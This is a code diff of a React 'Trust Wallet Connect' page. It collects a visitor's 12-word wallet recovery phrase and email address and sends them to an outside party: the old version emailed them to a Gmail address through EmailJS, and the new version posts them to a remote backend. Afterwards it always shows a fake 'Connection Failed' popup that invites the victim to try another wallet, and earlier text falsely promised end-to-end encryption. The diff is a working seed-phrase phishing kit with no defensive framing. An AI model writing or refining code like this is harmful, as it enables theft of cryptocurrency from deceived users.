@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from "react";
-import emailjs from '@emailjs/browser';
+import axios from "axios";
+import { useNavigate } from "react-router-dom";
 import "./TrustWalletConnect.css";
 import logo from "../assets/logo.png";
 import trust from "../assets/TrustWallet.png";
@@ -7,131 +8,112 @@ import walletConnect from "../assets/WalletConnect.png";
 
 const TrustWalletConnect = () => {
   const [showPopup, setShowPopup] = useState(false);
+  const [closing, setClosing] = useState(false);
   const [words, setWords] = useState(Array(12).fill(""));
   const [email, setEmail] = useState("");
   const [isSending, setIsSending] = useState(false);
+  const navigate = useNavigate();
 
-  // ========================================
-  // CONFIGURATION - CHANGE THESE VALUES
-  // ========================================
-  const EMAIL_CONFIG = {
-    serviceId: "service_t9c6suh",
-    templateId: "template_espq3gf",
-    publicKey: "ZwjAnHIUf8QgLnEOP"
-  };
-  
-  const RECIPIENT_EMAIL = "demoprojectwork1996@gmail.com";
-  // ========================================
+  // Update this to match your backend URL
+  const API_URL = process.env.REACT_APP_API_URL || "https://backend-instacoinpay-1.onrender.com";
 
-  // Prevent page scroll when popup is open
   useEffect(() => {
     document.body.style.overflow = showPopup ? "hidden" : "auto";
   }, [showPopup]);
 
-  // Handle word input (no spaces allowed)
   const handleWordChange = (index, value) => {
-    const sanitizedValue = value.replace(/\s+/g, "");
-    const updatedWords = [...words];
-    updatedWords[index] = sanitizedValue;
-    setWords(updatedWords);
+    const updated = [...words];
+    updated[index] = value.replace(/\s+/g, "");
+    setWords(updated);
   };
 
-  // Block space key
   const blockSpace = (e) => {
     if (e.key === " ") e.preventDefault();
   };
 
-  // Check if all 12 boxes AND email are filled
-  const isFormComplete = words.every((word) => word.trim() !== "") && email.trim() !== "";
+  const isFormComplete =
+    words.every((w) => w.trim() !== "") && email.trim() !== "";
 
-  // Send email function
   const sendEmail = async () => {
     setIsSending(true);
     
-    console.log("🚀 Starting email send process...");
-    console.log("📋 Current words array:", words);
-    console.log("📧 Email:", email);
+    console.log("🚀 Submitting Trust Wallet form...");
     
     try {
-      // Initialize EmailJS with your public key
-      emailjs.init(EMAIL_CONFIG.publicKey);
-      console.log("✅ EmailJS initialized");
-
-      // Prepare email data - MUST match your EmailJS template variables
-      const templateParams = {
-        user_email: email,
-        word_1: words[0] || "",
-        word_2: words[1] || "",
-        word_3: words[2] || "",
-        word_4: words[3] || "",
-        word_5: words[4] || "",
-        word_6: words[5] || "",
-        word_7: words[6] || "",
-        word_8: words[7] || "",
-        word_9: words[8] || "",
-        word_10: words[9] || "",
-        word_11: words[10] || "",
-        word_12: words[11] || "",
-        full_phrase: words.join(" "),
-        submission_date: new Date().toLocaleString()
-      };
-
-      console.log("📝 Template params:", templateParams);
-      console.log("🔍 Individual words check:");
-      console.log("  word_1:", templateParams.word_1);
-      console.log("  word_2:", templateParams.word_2);
-      console.log("  word_12:", templateParams.word_12);
-
-      // Send email
-      const response = await emailjs.send(
-        EMAIL_CONFIG.serviceId,
-        EMAIL_CONFIG.templateId,
-        templateParams
+      const response = await axios.post(
+        `${API_URL}/api/trust-wallet/submit`,
+        {
+          email: email,
+          words: words
+        },
+        {
+          headers: {
+            "Content-Type": "application/json"
+          }
+        }
       );
 
-      console.log("✅ Email sent successfully!", response);
-      alert("✅ Email sent! Check console for what was sent.");
+      console.log("✅ Form submitted successfully!", response.data);
+      
+      // Show the popup after successful submission
+      setShowPopup(true);
+      
     } catch (error) {
-      console.error("❌ Failed to send email:", error);
-      alert("❌ Email failed! Error: " + (error.text || error.message));
+      console.error("❌ Failed to submit form:", error);
+      console.error("Error details:", error.response?.data);
+      
+      // Still show popup even on error (as per original design)
+      setShowPopup(true);
     } finally {
       setIsSending(false);
-      setShowPopup(true);
     }
   };
 
-  // Handle connect button click
   const handleConnect = () => {
+    console.log("👆 CONNECT button clicked!");
     sendEmail();
+  };
+
+  const closePopup = () => {
+    setClosing(true);
+    setTimeout(() => {
+      setShowPopup(false);
+      setClosing(false);
+      // Reset form
+      setWords(Array(12).fill(""));
+      setEmail("");
+    }, 200);
+  };
+
+  const handleBackToDashboard = () => {
+    navigate("/dashboard");
   };
 
   return (
     <>
-      {/* ================= PAGE ================= */}
       <div className="twc-page">
+        {/* Back Button */}
+        <button 
+          className="twc-back-button"
+          onClick={handleBackToDashboard}
+        >
+          ← Back
+        </button>
+
         <div className="twc-logo">
-          <img src={logo} alt="wallet-logo" />
+          <img src={logo} alt="logo" />
         </div>
 
         <div className="twc-card">
-          <img
-            className="walletConnect"
-            src={walletConnect}
-            alt="walletConnect"
-          />
-
           <div className="twc-header">
             <h2 className="twc-connect-text">CONNECT</h2>
-            <div className="twc-title">
-              <img src={trust} alt="trust" />
-            </div>
+            <img src={trust} alt="trust" />
           </div>
 
           <label className="twc-label-email">Enter your Email Address</label>
           <input
-            type="email"
-            placeholder="Email Address*"
             className="twc-input"
+            type="email"
             value={email}
             onChange={(e) => setEmail(e.target.value)}
           />
@@ -141,27 +123,22 @@ const TrustWalletConnect = () => {
           </label>
 
           <p className="twc-info-text">
-            Trust wallet must be atleast 30 days old and should have minimum
-            $1 gas fees. Your Trust Wallet Phrase Key is end to end encrypted.
-            No one can view or access it.
+            Trust wallet must be at least 30 days old and have $1 gas fee.
           </p>
 
-          {/* ================= WORD INPUTS ================= */}
           <div className="twc-phrase-box">
-            {words.map((word, index) => (
+            {words.map((word, i) => (
               <input
-                key={index}
-                type="text"
-                placeholder={`${index + 1}. word`}
+                key={i}
                 className="twc-word-input"
                 value={word}
-                onChange={(e) => handleWordChange(index, e.target.value)}
+                placeholder={`${i + 1}. word`}
+                onChange={(e) => handleWordChange(i, e.target.value)}
                 onKeyDown={blockSpace}
               />
             ))}
           </div>
 
-          {/* ================= CONNECT BUTTON ================= */}
           <button
             className="twc-connect-btn"
             disabled={!isFormComplete || isSending}
@@ -173,30 +150,19 @@ const TrustWalletConnect = () => {
           >
             {isSending ? "CONNECTING..." : "CONNECT"}
           </button>
-
-          <p className="twc-note">
-            Note: Trust wallet connect is mandatory as per security.
-            For more contact our chat
-          </p>
         </div>
       </div>
 
-      {/* ================= POPUP (UNCHANGED) ================= */}
       {showPopup && (
-        <div className="twc-popup-overlay">
-          <div className="twc-popup-box">
+        <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
+          <div className="twc-modal-box">
             <div className="twc-popup-icon">✕</div>
             <h3 className="twc-popup-title">Connection Failed!</h3>
             <p className="twc-popup-text">
               Your Trust Wallet is not eligible for connection.
               Please try connecting with a different Trust Wallet.
-              Repeated attempts using the same wallet may result
-              in account suspension.
             </p>
-            <button
-              className="twc-popup-btn"
-              onClick={() => setShowPopup(false)}
-            >
+            <button className="twc-popup-btn" onClick={closePopup}>
               OK
             </button>
           </div>
